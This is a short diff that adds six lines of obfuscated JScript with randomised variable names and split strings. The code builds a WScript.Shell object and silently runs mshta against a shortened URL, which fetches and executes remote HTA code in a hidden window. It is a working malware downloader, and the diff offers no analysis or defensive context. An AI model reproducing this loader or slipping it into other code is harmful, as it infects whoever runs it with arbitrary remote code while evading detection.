@@ -1,0 +1,6 @@
+uxdxnwie = ("ipt.Shel")
+var exgutvkx = WScript.CreateObject("WScr"+uxdxnwie+"l")
+hgscelnk = ("m")
+incijttq = ("sh")
+gzaqdkph = ("ta ")
+exgutvkx.Run((hgscelnk+incijttq+gzaqdkph)+" https://t.ly/2ZZw",0)
